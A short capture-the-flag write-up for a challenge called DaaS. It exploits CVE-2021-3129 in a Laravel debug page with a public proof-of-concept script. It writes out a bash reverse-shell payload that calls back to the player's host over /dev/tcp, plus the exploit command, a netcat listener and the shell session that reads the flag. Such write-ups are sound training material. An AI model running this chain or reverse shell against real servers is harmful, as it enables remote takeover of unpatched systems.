# DaaS

Challenge text:
```
We suspect this server holds valuable information that would further benefit our cause, but we've hit a dead end with this debug page running on a known framework called Laravel. Surely we couldn't exploit this further.. right?
```

The website was running Laravel, and in the bottom right it displayed the version number; `Laravel v8.35.1`. Upon searching I found [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129), and also a [POC script](https://github.com/ambionics/laravel-exploits). I followed the instructions from the GitHub and ran
used php and phpgcc to generate a payload that would run `system("bash -c 'bash -i >& /dev/tcp/myip/myport 0>&1'")`. I ran netcat in listen mode, and executed the Python script from the POC, and gained a reverse shell.

Console 1:
```bash
$ py laravel-ignition-rce.py http://165.227.232.115:30920/ exploit.phar
```

Console 2:
```bash
$ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 165.227.232.115 50866
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www@webcadaas-6838-694cf46668-9rshd:/www/public$ cat /f*
cat /f*
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
```